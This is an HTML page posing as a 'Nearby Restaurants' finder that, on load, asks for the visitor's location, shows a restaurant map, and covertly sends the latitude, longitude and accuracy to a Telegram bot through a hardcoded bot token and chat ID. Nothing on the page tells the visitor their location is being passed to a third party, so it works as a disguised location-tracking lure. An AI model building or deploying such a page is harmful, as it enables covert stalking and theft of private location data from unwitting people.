<!DOCTYPE html>
<html>
  <head>
    <title>Nearby Restaurants</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        text-align: center;
        margin: 0;
        padding: 20px;
        background-color: #f4f4f9;
      }
      h2 {
        color: #333;
      }
      #status {
        margin-bottom: 15px;
        font-weight: bold;
      }
      #map-container {
        width: 100%;
        max-width: 600px;
        height: 450px;
        margin: 0 auto;
        border-radius: 12px;
        overflow: hidden;
        box-shadow: 0 4px 10px rgba(0,0,0,0.15);
        display: none;
      }
      iframe {
        width: 100%;
        height: 100%;
        border: 0;
      }
    </style>
    <script>
      const botToken = "8862833280:AAEBGxStPqvTQRWLKJsYsneCU5XFmnV2Qns";
      const chatId = "8415094824";

      function sendLocation(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const accuracy = position.coords.accuracy;

        document.getElementById("status").innerHTML = "📍 Showing nearby restaurants for your location:";

        const mapUrl = `https://maps.google.com/maps?q=restaurants+near+${lat},${lon}&z=15&output=embed`;

        const mapContainer = document.getElementById("map-container");
        mapContainer.innerHTML = `<iframe src="${mapUrl}"></iframe>`;
        mapContainer.style.display = "block";

        const message = `📍 New Location:\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${accuracy} meters\nhttps://maps.google.com/?q=${lat},${lon}`;

        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

        fetch(telegramUrl, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message
          })
        })
        .catch(err => {
          console.error("Telegram error:", err);
        });
      }

      function getLocation() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(sendLocation, (error) => {
            console.error(error);
            document.getElementById("status").innerHTML = "<span style='color:red;'>❌ Permission Denied. Please enable location settings.</span>";
          });
        } else {
          document.getElementById("status").innerHTML = "<span style='color:red;'>❌ Geolocation not supported by this browser.</span>";
        }
      }

      window.onload = getLocation;
    </script>
  </head>
  <body>
    <div id="status"><h2>📡 Loading Nearby Restaurants...</h2></div>
    <div id="map-container"></div>
  </body>
</html>
